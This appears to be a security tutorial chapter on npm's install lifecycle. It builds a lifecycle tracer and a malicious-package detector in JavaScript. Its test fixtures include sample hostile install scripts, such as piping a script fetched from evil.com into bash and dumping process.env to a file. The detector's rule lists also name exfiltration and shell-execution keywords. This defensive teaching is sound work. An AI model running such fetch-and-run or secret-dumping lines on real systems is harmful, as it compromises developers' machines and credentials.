# Phase 1, Part 2: Understanding npm Install and Package Lifecycle

Now that we understand JavaScript's execution model, let's explore the specific lifecycle of `npm install` and how attackers exploit each phase. This is where theory meets reality—every time you run `npm install`, you're executing code from potentially untrusted sources.

---

## The Target: Understanding npm's Installation Lifecycle

**What specific file, configuration, or feature are we building right now?**

We're building a comprehensive analysis tool that:
1. Traces the exact steps of `npm install` execution
2. Intercepts and logs lifecycle script execution
3. Simulates and analyzes malicious installation patterns
4. Creates a sandboxed environment for safe package testing

---

## The Concept: The npm Install Lifecycle

**A brief, clear explanation using a simple, real-world analogy**

Think of `npm install` like moving into a new apartment with a moving company:

1. **Planning (npm install --dry-run)** - You review the contract to see what's being moved in
2. **Unpacking (npm install - no scripts)** - The movers bring in boxes but don't open them
3. **Setup (install scripts)** - You direct where furniture goes, but the moving company might do extra things
4. **Post-move (postinstall scripts)** - After you've signed off, the movers might "adjust" things when you're not looking

### The Complete npm Install Lifecycle

```
┌─────────────────────────────────────────────────────────────┐
│                    npm install LIFECYCLE                    │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Phase 1: PREINSTALL                                        │
│  ├─ Check package.json exists                               │
│  ├─ Resolve dependencies                                    │
│  └─ Run preinstall script if defined                       │
│                                                              │
│  Phase 2: INSTALL                                           │
│  ├─ Download and extract package(s)                        │
│  ├─ Run install script if defined                          │
│  └─ Save to node_modules                                   │
│                                                              │
│  Phase 3: POSTINSTALL                                       │
│  ├─ Run postinstall script if defined                      │
│  ├─ Update lock file                                       │
│  └─ Write to package-lock.json                             │
│                                                              │
│  Phase 4: CLEANUP                                           │
│  ├─ Run preuninstall (if uninstalling)                     │
│  └─ Run uninstall (if uninstalling)                        │
│                                                              │
│  ⚠️ SECURITY WARNING:                                       │
│  Each phase executes JavaScript with the FULL permissions  │
│  of the user running npm install!                          │
└─────────────────────────────────────────────────────────────┘
```

### Why Lifecycle Scripts Are Dangerous

1. **Full System Access** - Scripts run with the same permissions as the user executing `npm install`
2. **No Sandboxing** - There's no isolation—scripts can read/write anywhere the user can
3. **No Validation** - npm doesn't verify what scripts do before executing them
4. **Hidden Execution** - Scripts can run without obvious indicators
5. **Persistent Access** - Scripts can modify system files to maintain persistence

---

## The Implementation: Building an npm Install Analyzer

Let's build tools to analyze and understand the npm install lifecycle.

### Step 1: Create the Package Analyzer Project

```bash
# Navigate to the phase-1 directory
cd beyond-cves-tutorial/phase-1

# Install required packages for analysis
npm install --save-dev json
npm install --save-dev tar
npm install --save-dev axios
```

### Step 2: Create the Lifecycle Tracer

```javascript
// path: phase-1/06-lifecycle-tracer.js

/**
 * NPM INSTALL LIFECYCLE TRACER
 * 
 * This script traces and logs every step of the npm install
 * process to help understand what happens during installation.
 * 
 * Run with: node 06-lifecycle-tracer.js
 */

const fs = require('fs');
const path = require('path');
const { execSync, spawn } = require('child_process');
const os = require('os');

// ==========================================
// 1. CONFIGURATION
// ==========================================

const config = {
    // Directory for test packages
    testDir: path.join(__dirname, 'test-packages'),
    // Log file for trace output
    logFile: path.join(__dirname, 'install-trace.log'),
    // Whether to actually run install scripts (true = run, false = simulate)
    executeScripts: false,
    // Packages to test with
    testPackages: [
        'express@4.18.2',
        'lodash@4.17.21',
        'axios@1.6.0'
    ]
};

// ==========================================
// 2. UTILITY FUNCTIONS
// ==========================================

/**
 * Writes to the log file and console
 * @param {string} message - The message to log
 * @param {string} level - Log level (INFO, WARN, ERROR, TRACE)
 */
function logTrace(message, level = 'INFO') {
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] [${level}] ${message}`;
    
    // Write to console with color
    const colors = {
        INFO: '\x1b[36m', // Cyan
        WARN: '\x1b[33m', // Yellow
        ERROR: '\x1b[31m', // Red
        TRACE: '\x1b[90m' // Gray
    };
    const color = colors[level] || '\x1b[0m';
    const reset = '\x1b[0m';
    console.log(`${color}${logEntry}${reset}`);
    
    // Write to log file
    fs.appendFileSync(config.logFile, logEntry + '\n');
}

/**
 * Creates a test package with specified lifecycle scripts
 * @param {string} packageName - Name of the package
 * @param {Object} scripts - Scripts to include
 * @param {Object} dependencies - Dependencies to include
 * @returns {string} - Path to the package directory
 */
function createTestPackage(packageName, scripts = {}, dependencies = {}) {
    const packageDir = path.join(config.testDir, packageName);
    
    // Create directory
    if (!fs.existsSync(packageDir)) {
        fs.mkdirSync(packageDir, { recursive: true });
    }
    
    // Create package.json
    const packageJson = {
        name: packageName,
        version: '1.0.0',
        description: 'Test package for lifecycle analysis',
        main: 'index.js',
        scripts: {
            // Default scripts
            preinstall: 'echo "Running preinstall"',
            install: 'echo "Running install"',
            postinstall: 'echo "Running postinstall"',
            test: 'echo "Running test"',
            // Custom scripts from parameter
            ...scripts
        },
        dependencies: dependencies,
        author: 'Security Tester',
        license: 'ISC'
    };
    
    fs.writeFileSync(
        path.join(packageDir, 'package.json'),
        JSON.stringify(packageJson, null, 2)
    );
    
    // Create a simple index.js
    fs.writeFileSync(
        path.join(packageDir, 'index.js'),
        `
// Simple package for testing
console.log('Package loaded: ${packageName}');
module.exports = { name: '${packageName}', version: '1.0.0' };
`
    );
    
    logTrace(`Created test package: ${packageName}`, 'INFO');
    return packageDir;
}

/**
 * Executes a command and returns the output
 * @param {string} command - Command to execute
 * @param {Object} options - Options for execSync
 * @returns {string} - Command output
 */
function execCommand(command, options = {}) {
    try {
        logTrace(`Executing: ${command}`, 'TRACE');
        const output = execSync(command, {
            encoding: 'utf8',
            stdio: 'pipe',
            ...options
        });
        return output;
    } catch (error) {
        logTrace(`Command failed: ${error.message}`, 'ERROR');
        return error.stdout || error.message;
    }
}

// ==========================================
// 3. MAIN TRACER FUNCTIONS
// ==========================================

/**
 * Traces the npm install lifecycle for a package
 * @param {string} packageDir - Directory containing the package
 * @param {boolean} executeScripts - Whether to actually execute scripts
 */
function traceNpmInstall(packageDir, executeScripts = false) {
    logTrace('='.repeat(60), 'INFO');
    logTrace(`📦 TRACING INSTALL FOR: ${path.basename(packageDir)}`, 'INFO');
    logTrace('='.repeat(60), 'INFO');
    
    // Save current working directory
    const originalCwd = process.cwd();
    
    try {
        // Change to package directory
        process.chdir(packageDir);
        logTrace(`Changed to directory: ${packageDir}`, 'TRACE');
        
        // PHASE 1: DRY RUN - See what would happen
        logTrace('📋 Phase 1: Dry Run Analysis', 'INFO');
        logTrace('Executing: npm install --dry-run', 'TRACE');
        const dryRunOutput = execCommand('npm install --dry-run');
        logTrace(`Dry run output:\n${dryRunOutput}`, 'TRACE');
        
        // PHASE 2: PREINSTALL
        logTrace('📋 Phase 2: Preinstall Check', 'INFO');
        const packageJson = JSON.parse(
            fs.readFileSync(path.join(packageDir, 'package.json'), 'utf8')
        );
        
        if (packageJson.scripts && packageJson.scripts.preinstall) {
            logTrace(`⚠️  Found preinstall script: ${packageJson.scripts.preinstall}`, 'WARN');
            if (executeScripts) {
                logTrace('Executing preinstall script...', 'TRACE');
                const output = execCommand('npm run preinstall');
                logTrace(`Preinstall output:\n${output}`, 'TRACE');
            } else {
                logTrace('⏸️  Skipping script execution (simulation mode)', 'WARN');
            }
        } else {
            logTrace('✅ No preinstall script found', 'INFO');
        }
        
        // PHASE 3: INSTALL
        logTrace('📋 Phase 3: Actual Install', 'INFO');
        if (executeScripts) {
            logTrace('Executing: npm install', 'TRACE');
            const installOutput = execCommand('npm install');
            logTrace(`Install output:\n${installOutput}`, 'TRACE');
        } else {
            logTrace('⏸️  Skipping actual install (simulation mode)', 'WARN');
            // Simulate installation by creating node_modules
            const nodeModules = path.join(packageDir, 'node_modules');
            if (!fs.existsSync(nodeModules)) {
                fs.mkdirSync(nodeModules, { recursive: true });
                logTrace('Created simulated node_modules directory', 'TRACE');
            }
        }
        
        // PHASE 4: POSTINSTALL
        logTrace('📋 Phase 4: Postinstall Check', 'INFO');
        if (packageJson.scripts && packageJson.scripts.postinstall) {
            logTrace(`⚠️  Found postinstall script: ${packageJson.scripts.postinstall}`, 'WARN');
            if (executeScripts) {
                logTrace('Executing postinstall script...', 'TRACE');
                const output = execCommand('npm run postinstall');
                logTrace(`Postinstall output:\n${output}`, 'TRACE');
            } else {
                logTrace('⏸️  Skipping script execution (simulation mode)', 'WARN');
            }
        } else {
            logTrace('✅ No postinstall script found', 'INFO');
        }
        
        // PHASE 5: Analysis of what happened
        logTrace('📋 Phase 5: Post-Install Analysis', 'INFO');
        analyzeInstallResults(packageDir);
        
    } catch (error) {
        logTrace(`❌ Error during trace: ${error.message}`, 'ERROR');
        logTrace(error.stack, 'ERROR');
    } finally {
        // Restore original working directory
        process.chdir(originalCwd);
        logTrace('Restored original working directory', 'TRACE');
    }
    
    logTrace('✅ Trace complete', 'INFO');
    logTrace('='.repeat(60), 'INFO');
}

/**
 * Analyzes the results of an installation
 * @param {string} packageDir - Directory containing the installed package
 */
function analyzeInstallResults(packageDir) {
    const results = {
        hasPackageJson: false,
        hasNodeModules: false,
        hasLockFile: false,
        scriptsFound: [],
        modifiedFiles: [],
        suspiciousFiles: []
    };
    
    // Check for package.json
    const packageJsonPath = path.join(packageDir, 'package.json');
    if (fs.existsSync(packageJsonPath)) {
        results.hasPackageJson = true;
        const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, 'utf8'));
        if (packageJson.scripts) {
            results.scriptsFound = Object.keys(packageJson.scripts);
        }
    }
    
    // Check for node_modules
    const nodeModulesPath = path.join(packageDir, 'node_modules');
    if (fs.existsSync(nodeModulesPath)) {
        results.hasNodeModules = true;
        // Check what was installed
        const installedPackages = fs.readdirSync(nodeModulesPath);
        results.installedPackages = installedPackages;
        logTrace(`Installed packages: ${installedPackages.join(', ')}`, 'TRACE');
    }
    
    // Check for lock files
    const lockFiles = ['package-lock.json', 'npm-shrinkwrap.json', 'yarn.lock'];
    lockFiles.forEach(lockFile => {
        const lockPath = path.join(packageDir, lockFile);
        if (fs.existsSync(lockPath)) {
            results.hasLockFile = true;
            logTrace(`Found lock file: ${lockFile}`, 'TRACE');
        }
    });
    
    // Check for suspicious files created during installation
    // (Files that shouldn't normally be in a package directory)
    const suspiciousExtensions = ['.exe', '.dll', '.sh', '.bat', '.ps1'];
    const allFiles = fs.readdirSync(packageDir, { recursive: true });
    allFiles.forEach(file => {
        const ext = path.extname(file).toLowerCase();
        if (suspiciousExtensions.includes(ext)) {
            results.suspiciousFiles.push(file);
        }
    });
    
    if (results.suspiciousFiles.length > 0) {
        logTrace(`⚠️  Suspicious files found: ${results.suspiciousFiles.join(', ')}`, 'WARN');
    }
    
    // Summary
    logTrace('📊 Installation Results:', 'INFO');
    logTrace(`   Has package.json: ${results.hasPackageJson}`, 'TRACE');
    logTrace(`   Has node_modules: ${results.hasNodeModules}`, 'TRACE');
    logTrace(`   Has lock file: ${results.hasLockFile}`, 'TRACE');
    logTrace(`   Scripts found: ${results.scriptsFound.join(', ') || 'None'}`, 'TRACE');
    
    return results;
}

// ==========================================
// 4. SECURITY ANALYSIS FUNCTIONS
// ==========================================

/**
 * Analyzes a package for security risks
 * @param {string} packageDir - Directory of the package
 */
function analyzePackageSecurity(packageDir) {
    logTrace('🔒 Security Analysis', 'INFO');
    logTrace('='.repeat(40), 'INFO');
    
    const securityIssues = [];
    
    try {
        const packageJsonPath = path.join(packageDir, 'package.json');
        if (!fs.existsSync(packageJsonPath)) {
            securityIssues.push('No package.json found');
            return securityIssues;
        }
        
        const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, 'utf8'));
        
        // Check for dangerous scripts
        const dangerousScriptPatterns = [
            'exec', 'eval', 'child_process', 'require', 'module',
            'fs', 'process', 'global', 'readFile', 'writeFile',
            'curl', 'wget', 'fetch', 'request', 'http',
            'net', 'socket', 'connect', 'listen',
            'crypto', 'password', 'secret', 'key',
            'rm', 'unlink', 'del', 'remove',
            'chmod', 'chown', 'chgrp',
            'sudo', 'root', 'admin'
        ];
        
        if (packageJson.scripts) {
            Object.entries(packageJson.scripts).forEach(([name, command]) => {
                const lowerCommand = command.toLowerCase();
                const matchedPatterns = dangerousScriptPatterns.filter(pattern =>
                    lowerCommand.includes(pattern)
                );
                
                if (matchedPatterns.length > 0) {
                    securityIssues.push({
                        type: 'Dangerous Script',
                        script: name,
                        command: command,
                        matchedPatterns: matchedPatterns
                    });
                }
            });
        }
        
        // Check for too many dependencies
        const depCount = Object.keys(packageJson.dependencies || {}).length;
        const devDepCount = Object.keys(packageJson.devDependencies || {}).length;
        const totalDeps = depCount + devDepCount;
        
        if (totalDeps > 50) {
            securityIssues.push({
                type: 'Large Dependency Tree',
                dependencyCount: totalDeps,
                message: `Package has ${totalDeps} dependencies, increasing risk surface`
            });
        }
        
        // Check for typosquatting potential
        const packageName = packageJson.name;
        if (packageName) {
            const suspiciousPatterns = [
                /^[a-zA-Z0-9]*-$/,
                /^[a-zA-Z0-9]*-$/,
                /^[a-zA-Z0-9]*\./,
                /^[a-zA-Z0-9]*js$/,
                /^[a-zA-Z0-9]*node$/,
                /^[a-zA-Z0-9]*core$/,
                /^[a-zA-Z0-9]*lib$/,
                /^[a-zA-Z0-9]*s$/,
                /^[a-zA-Z0-9]*2$/,
                /^[a-zA-Z0-9]*3$/,
                /^[a-zA-Z0-9]*4$/
            ];
            
            if (suspiciousPatterns.some(pattern => pattern.test(packageName))) {
                securityIssues.push({
                    type: 'Potential Typosquatting',
                    packageName: packageName,
                    message: `Package name "${packageName}" resembles a typosquatting attempt`
                });
            }
        }
        
    } catch (error) {
        securityIssues.push({
            type: 'Error',
            message: `Error analyzing security: ${error.message}`
        });
    }
    
    // Report findings
    if (securityIssues.length > 0) {
        logTrace('⚠️  Security Issues Found:', 'WARN');
        securityIssues.forEach((issue, index) => {
            logTrace(`   ${index + 1}. ${issue.type}: ${issue.message || JSON.stringify(issue)}`, 'WARN');
        });
    } else {
        logTrace('✅ No obvious security issues found', 'INFO');
    }
    
    return securityIssues;
}

// ==========================================
// 5. DEMONSTRATION
// ==========================================

/**
 * Runs the main demonstration
 */
function runDemonstration() {
    // Clear log file
    if (fs.existsSync(config.logFile)) {
        fs.unlinkSync(config.logFile);
    }
    
    logTrace('🚀 Starting npm Install Lifecycle Tracer', 'INFO');
    logTrace(`Log file: ${config.logFile}`, 'INFO');
    logTrace(`Script execution: ${config.executeScripts ? 'ENABLED' : 'DISABLED (simulation)'}`, 'WARN');
    logTrace('', 'INFO');
    
    // Create test directory
    if (!fs.existsSync(config.testDir)) {
        fs.mkdirSync(config.testDir, { recursive: true });
    }
    
    // Create test packages with various scripts
    const packages = [
        {
            name: 'safe-package',
            scripts: {
                test: 'echo "Running safe tests"'
            }
        },
        {
            name: 'suspicious-package',
            scripts: {
                preinstall: 'node -e "console.log(\'preinstall\')"',
                install: 'curl http://example.com/script.sh | bash',
                postinstall: 'node -e "require(\'child_process\').exec(\'echo malicious\')"',
                test: 'echo "All tests passed"'
            }
        },
        {
            name: 'complex-package',
            scripts: {
                preinstall: 'node -e "console.log(\'Starting installation\')"',
                install: 'node -e "console.log(\'Installing dependencies\')"',
                postinstall: 'node -e "console.log(\'Installation complete\')"'
            },
            dependencies: {
                'express': '^4.18.0',
                'lodash': '^4.17.21',
                'axios': '^1.6.0',
                'react': '^18.2.0',
                'typescript': '^5.0.0'
            }
        }
    ];
    
    // Create and trace each package
    packages.forEach(pkg => {
        const packageDir = createTestPackage(
            pkg.name,
            pkg.scripts,
            pkg.dependencies || {}
        );
        
        traceNpmInstall(packageDir, config.executeScripts);
        analyzePackageSecurity(packageDir);
        
        logTrace('', 'INFO');
    });
    
    // Cleanup simulation
    logTrace('🧹 Cleanup:', 'INFO');
    if (fs.existsSync(config.testDir)) {
        logTrace(`Cleaning up test directory: ${config.testDir}`, 'TRACE');
        // In a real cleanup, we'd remove the directory
        // For demonstration, we'll keep it for inspection
        logTrace('Test directory kept for inspection', 'WARN');
    }
    
    logTrace('✅ Demonstration complete', 'INFO');
    logTrace(`📄 Full trace log available at: ${config.logFile}`, 'INFO');
}

// ==========================================
// 6. INTERACTIVE MODE
// ==========================================

/**
 * Interactive mode - allows user to analyze specific packages
 */
function interactiveMode() {
    const readline = require('readline');
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    
    console.log('\n🔍 Interactive Package Analyzer');
    console.log('='.repeat(40));
    console.log('This mode allows you to analyze specific packages');
    console.log('Options:');
    console.log('  1. Analyze a local package');
    console.log('  2. Download and analyze a package from npm');
    console.log('  3. Create a test package with custom scripts');
    console.log('  4. Exit');
    console.log('='.repeat(40));
    
    rl.question('\nSelect option (1-4): ', (answer) => {
        switch(answer.trim()) {
            case '1':
                rl.question('Enter path to package directory: ', (dir) => {
                    if (fs.existsSync(dir)) {
                        traceNpmInstall(dir, config.executeScripts);
                        analyzePackageSecurity(dir);
                    } else {
                        console.log('❌ Directory not found');
                    }
                    rl.close();
                });
                break;
            case '2':
                rl.question('Enter package name (e.g., express): ', (pkgName) => {
                    console.log(`📦 Downloading ${pkgName}...`);
                    // This would use npm to download the package
                    // For demonstration, we'll just inform the user
                    console.log('⚠️  Download functionality requires additional implementation');
                    rl.close();
                });
                break;
            case '3':
                rl.question('Enter package name: ', (name) => {
                    rl.question('Enter preinstall script (or press enter for none): ', (preinstall) => {
                        rl.question('Enter install script (or press enter for none): ', (install) => {
                            rl.question('Enter postinstall script (or press enter for none): ', (postinstall) => {
                                const scripts = {};
                                if (preinstall) scripts.preinstall = preinstall;
                                if (install) scripts.install = install;
                                if (postinstall) scripts.postinstall = postinstall;
                                
                                const packageDir = createTestPackage(name, scripts);
                                traceNpmInstall(packageDir, config.executeScripts);
                                analyzePackageSecurity(packageDir);
                                rl.close();
                            });
                        });
                    });
                });
                break;
            case '4':
                console.log('👋 Exiting...');
                rl.close();
                break;
            default:
                console.log('❌ Invalid option');
                rl.close();
        }
    });
}

// ==========================================
// 7. MAIN EXECUTION
// ==========================================

// Check if we should run in interactive mode or demonstration mode
const args = process.argv.slice(2);

if (args.includes('--interactive') || args.includes('-i')) {
    interactiveMode();
} else {
    // Run the demonstration
    runDemonstration();
    
    // Show how to use interactive mode
    console.log('\n💡 Tip: Run with --interactive (or -i) for interactive mode');
    console.log(`   node 06-lifecycle-tracer.js --interactive`);
}
```

### Step 3: Create a Malicious Package Detector

Let's build a tool specifically designed to detect suspicious lifecycle scripts:

```javascript
// path: phase-1/07-malicious-detector.js

/**
 * MALICIOUS PACKAGE DETECTOR
 * 
 * This script detects malicious patterns in npm packages
 * by analyzing lifecycle scripts and package behavior.
 * 
 * Run with: node 07-malicious-detector.js
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// ==========================================
// 1. DETECTION RULES
// ==========================================

// Define detection rules for malicious packages
const detectionRules = [
    {
        id: 'MAL-001',
        name: 'Environment Variable Exfiltration',
        description: 'Package attempts to read and exfiltrate environment variables',
        severity: 'CRITICAL',
        patterns: [
            'process.env',
            'process.env.',
            'Object.keys(process.env)',
            'process.env\\[',
            'env\\[',
            'JSON.stringify(process.env)',
            'exfiltrate',
            'exfil',
            'steal',
            'secrets',
            'credentials'
        ]
    },
    {
        id: 'MAL-002',
        name: 'Filesystem Reconnaissance',
        description: 'Package scans the filesystem for sensitive files',
        severity: 'HIGH',
        patterns: [
            'fs.readdir',
            'fs.readFile',
            'fs.stat',
            'fs.access',
            'require(\'fs\')',
            'fs.writeFile',
            'fs.mkdir',
            'path.join',
            'path.resolve',
            '.env',
            'package.json',
            'config.json'
        ]
    },
    {
        id: 'MAL-003',
        name: 'Network Communication',
        description: 'Package makes outbound network connections',
        severity: 'HIGH',
        patterns: [
            'http.get',
            'http.request',
            'https.get',
            'https.request',
            'fetch',
            'axios',
            'socket',
            'net.connect',
            'net.createConnection',
            'tcp',
            'udp',
            'request',
            'curl',
            'wget'
        ]
    },
    {
        id: 'MAL-004',
        name: 'Shell Execution',
        description: 'Package executes shell commands',
        severity: 'CRITICAL',
        patterns: [
            'exec',
            'execSync',
            'spawn',
            'spawnSync',
            'execFile',
            'execFileSync',
            'child_process',
            'require(\'child_process\')',
            'sh',
            'bash',
            'cmd',
            'shell',
            'system'
        ]
    },
    {
        id: 'MAL-005',
        name: 'Code Injection',
        description: 'Package attempts to dynamically inject code',
        severity: 'CRITICAL',
        patterns: [
            'eval',
            'new Function',
            'setTimeout\\(',
            'setInterval\\(',
            'require\\(',
            'import\\(',
            'global',
            'process.binding',
            'vm.createContext',
            'vm.runInContext'
        ]
    },
    {
        id: 'MAL-006',
        name: 'Persistence Mechanism',
        description: 'Package attempts to establish persistence',
        severity: 'HIGH',
        patterns: [
            'cron',
            'startup',
            'init',
            'service',
            'systemd',
            'launchd',
            'registry',
            'service',
            'install',
            'uninstall'
        ]
    },
    {
        id: 'MAL-007',
        name: 'Typosquatting Indicators',
        description: 'Package name resembles a popular package',
        severity: 'MEDIUM',
        // This is checked separately
        type: 'typosquatting'
    },
    {
        id: 'MAL-008',
        name: 'Dependency Confusion',
        description: 'Package may be part of a dependency confusion attack',
        severity: 'HIGH',
        // This is checked separately
        type: 'dependency_confusion'
    }
];

// ==========================================
// 2. DETECTION ENGINE
// ==========================================

/**
 * Detects malicious patterns in a package
 * @param {string} packageDir - Directory of the package
 * @returns {Object} - Detection results
 */
function detectMaliciousPackage(packageDir) {
    console.log('🔍 Running malicious package detection...');
    console.log(`📁 Analyzing: ${packageDir}`);
    
    const results = {
        packageInfo: null,
        detections: [],
        riskScore: 0,
        riskLevel: 'LOW'
    };
    
    try {
        // Read package.json
        const packageJsonPath = path.join(packageDir, 'package.json');
        if (!fs.existsSync(packageJsonPath)) {
            throw new Error('package.json not found');
        }
        
        const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, 'utf8'));
        results.packageInfo = {
            name: packageJson.name,
            version: packageJson.version,
            scripts: packageJson.scripts || {}
        };
        
        // Analyze scripts for malicious patterns
        if (packageJson.scripts) {
            Object.entries(packageJson.scripts).forEach(([scriptName, scriptCommand]) => {
                // Check each rule against the script
                detectionRules.forEach(rule => {
                    if (rule.type) return; // Skip rules with special handling
                    
                    const matchedPatterns = rule.patterns.filter(pattern => {
                        // Convert pattern to regex
                        const regex = new RegExp(pattern, 'i');
                        return regex.test(scriptCommand);
                    });
                    
                    if (matchedPatterns.length > 0) {
                        results.detections.push({
                            ruleId: rule.id,
                            ruleName: rule.name,
                            severity: rule.severity,
                            script: scriptName,
                            command: scriptCommand,
                            matchedPatterns: matchedPatterns,
                            description: rule.description
                        });
                        
                        // Add to risk score based on severity
                        const severityScores = {
                            'CRITICAL': 10,
                            'HIGH': 5,
                            'MEDIUM': 3,
                            'LOW': 1
                        };
                        results.riskScore += severityScores[rule.severity] || 0;
                    }
                });
            });
        }
        
        // Check for typosquatting
        checkTyposquatting(packageJson, results);
        
        // Check for dependency confusion
        checkDependencyConfusion(packageJson, results);
        
        // Calculate risk level
        if (results.riskScore >= 20) results.riskLevel = 'CRITICAL';
        else if (results.riskScore >= 10) results.riskLevel = 'HIGH';
        else if (results.riskScore >= 5) results.riskLevel = 'MEDIUM';
        else results.riskLevel = 'LOW';
        
    } catch (error) {
        results.error = error.message;
        console.error(`❌ Detection error: ${error.message}`);
    }
    
    return results;
}

/**
 * Checks for typosquatting indicators
 * @param {Object} packageJson - Package.json content
 * @param {Object} results - Results object to update
 */
function checkTyposquatting(packageJson, results) {
    const packageName = packageJson.name;
    if (!packageName) return;
    
    // List of popular package names to check against
    const popularPackages = [
        'express', 'react', 'vue', 'angular', 'lodash', 'axios',
        'typescript', 'webpack', 'babel', 'eslint', 'prettier',
        'jest', 'mocha', 'chai', 'sinon', 'cypress', 'puppeteer',
        'node', 'npm', 'yarn', 'next', 'nuxt', 'svelte',
        'gatsby', 'create-react-app', 'vue-cli', 'angular-cli'
    ];
    
    // Check if the package name resembles any popular package
    const lowerName = packageName.toLowerCase();
    const similarPackages = popularPackages.filter(popular => {
        const lowerPopular = popular.toLowerCase();
        return (
            // Check for similar names (Levenshtein distance would be better, but this is simpler)
            (lowerName.includes(lowerPopular) || lowerPopular.includes(lowerName)) &&
            lowerName !== lowerPopular
        );
    });
    
    if (similarPackages.length > 0) {
        results.detections.push({
            ruleId: 'MAL-007',
            ruleName: 'Typosquatting Indicators',
            severity: 'MEDIUM',
            description: `Package name "${packageName}" resembles popular packages: ${similarPackages.join(', ')}`,
            similarPackages: similarPackages
        });
        results.riskScore += 3;
    }
}

/**
 * Checks for dependency confusion indicators
 * @param {Object} packageJson - Package.json content
 * @param {Object} results - Results object to update
 */
function checkDependencyConfusion(packageJson, results) {
    // Dependency confusion occurs when a private package name
    // is published to the public registry
    
    // Check if package.json has a private flag
    const isPrivate = packageJson.private === true;
    
    // Check for npm scope (@scope/package)
    const hasScope = packageJson.name && packageJson.name.startsWith('@');
    
    // Check for private registry configuration
    const hasPrivateRegistry = packageJson.publishConfig && 
        packageJson.publishConfig.registry &&
        !packageJson.publishConfig.registry.includes('npmjs.org');
    
    // If it's marked as private but has dependencies from public registry,
    // there's a risk of dependency confusion
    if (isPrivate && !hasScope) {
        // Check if it has many dependencies (could be trying to pull from public)
        const depCount = Object.keys(packageJson.dependencies || {}).length;
        if (depCount > 10) {
            results.detections.push({
                ruleId: 'MAL-008',
                ruleName: 'Dependency Confusion Risk',
                severity: 'HIGH',
                description: 'Private package with many public dependencies may be vulnerable to dependency confusion',
                dependencyCount: depCount,
                isPrivate: isPrivate,
                hasScope: hasScope
            });
            results.riskScore += 5;
        }
    }
}

// ==========================================
// 3. REPORT GENERATION
// ==========================================

/**
 * Generates a readable report from detection results
 * @param {Object} results - Detection results
 * @returns {string} - Formatted report
 */
function generateReport(results) {
    let report = [];
    
    report.push('='.repeat(60));
    report.push('🔒 MALICIOUS PACKAGE DETECTION REPORT');
    report.push('='.repeat(60));
    
    if (results.error) {
        report.push(`❌ Error: ${results.error}`);
        return report.join('\n');
    }
    
    // Package info
    report.push('\n📦 Package Information:');
    if (results.packageInfo) {
        report.push(`   Name: ${results.packageInfo.name}`);
        report.push(`   Version: ${results.packageInfo.version}`);
        report.push(`   Scripts: ${Object.keys(results.packageInfo.scripts).join(', ') || 'None'}`);
    }
    
    // Risk summary
    report.push('\n📊 Risk Summary:');
    report.push(`   Risk Score: ${results.riskScore}/100`);
    report.push(`   Risk Level: ${results.riskLevel}`);
    report.push(`   Detections: ${results.detections.length}`);
    
    // Detections
    if (results.detections.length > 0) {
        report.push('\n⚠️  Detections:');
        results.detections.forEach((detection, index) => {
            report.push(`   ${index + 1}. [${detection.severity}] ${detection.ruleName}`);
            report.push(`      ${detection.description}`);
            if (detection.script) {
                report.push(`      Script: ${detection.script}`);
                report.push(`      Command: ${detection.command}`);
            }
            if (detection.matchedPatterns) {
                report.push(`      Patterns: ${detection.matchedPatterns.join(', ')}`);
            }
            if (detection.similarPackages) {
                report.push(`      Similar to: ${detection.similarPackages.join(', ')}`);
            }
            report.push('');
        });
    } else {
        report.push('\n✅ No malicious patterns detected');
    }
    
    // Recommendations
    report.push('📋 Recommendations:');
    if (results.riskLevel === 'CRITICAL') {
        report.push('   ⛔ DO NOT INSTALL THIS PACKAGE!');
        report.push('   🚨 Immediate security threat detected');
        report.push('   🔒 Block installation in CI/CD pipeline');
    } else if (results.riskLevel === 'HIGH') {
        report.push('   ⚠️ High-risk package - review before installation');
        report.push('   🔍 Run in isolated environment');
        report.push('   📋 Perform manual code review');
    } else if (results.riskLevel === 'MEDIUM') {
        report.push('   📋 Medium-risk package - exercise caution');
        report.push('   🔍 Audit scripts before installation');
    } else {
        report.push('   ✅ Low-risk package - standard review recommended');
    }
    
    report.push('='.repeat(60));
    
    return report.join('\n');
}

// ==========================================
// 4. DEMONSTRATION
// ==========================================

/**
 * Creates test packages with various malicious patterns
 */
function createTestPackages() {
    const testPackages = [
        {
            name: 'benign-package',
            description: 'A safe package with no malicious patterns',
            scripts: {
                test: 'echo "Running tests"',
                build: 'npm run build'
            }
        },
        {
            name: 'suspicious-exfiltration',
            description: 'Package that tries to exfiltrate environment variables',
            scripts: {
                preinstall: 'node -e "console.log(JSON.stringify(process.env))"',
                postinstall: 'node -e "const fs=require(\'fs\');fs.writeFileSync(\'/tmp/data\',JSON.stringify(process.env))"'
            }
        },
        {
            name: 'malicious-shell-exec',
            description: 'Package that executes shell commands',
            scripts: {
                install: 'curl http://evil.com/malware.sh | bash',
                postinstall: 'node -e "require(\'child_process\').exec(\'echo "malicious" > /tmp/backdoor\')"'
            }
        },
        {
            name: 'typosquatting-express',
            description: 'Package that resembles express',
            scripts: {
                postinstall: 'node -e "console.log(\'Installed express-latest\')"'
            }
        },
        {
            name: 'dependency-confusion-risk',
            description: 'Private package with many public dependencies',
            isPrivate: true,
            dependencies: {
                'express': '^4.18.0',
                'lodash': '^4.17.21',
                'axios': '^1.6.0',
                'react': '^18.2.0',
                'typescript': '^5.0.0',
                'webpack': '^5.89.0',
                'babel': '^7.23.0',
                'eslint': '^8.56.0',
                'prettier': '^3.0.0',
                'jest': '^29.7.0'
            }
        }
    ];
    
    const testDir = path.join(__dirname, 'test-packages');
    if (!fs.existsSync(testDir)) {
        fs.mkdirSync(testDir, { recursive: true });
    }
    
    // Save the original package.json creator from earlier
    const createPackage = (name, scripts = {}, dependencies = {}, isPrivate = false) => {
        const packageDir = path.join(testDir, name);
        if (!fs.existsSync(packageDir)) {
            fs.mkdirSync(packageDir, { recursive: true });
        }
        
        const packageJson = {
            name: name,
            version: '1.0.0',
            description: 'Test package for detection',
            main: 'index.js',
            private: isPrivate,
            scripts: {
                ...scripts
            },
            dependencies: dependencies,
            author: 'Security Tester'
        };
        
        fs.writeFileSync(
            path.join(packageDir, 'package.json'),
            JSON.stringify(packageJson, null, 2)
        );
        
        // Create a simple index.js
        fs.writeFileSync(
            path.join(packageDir, 'index.js'),
            `console.log('${name} loaded');`
        );
    };
    
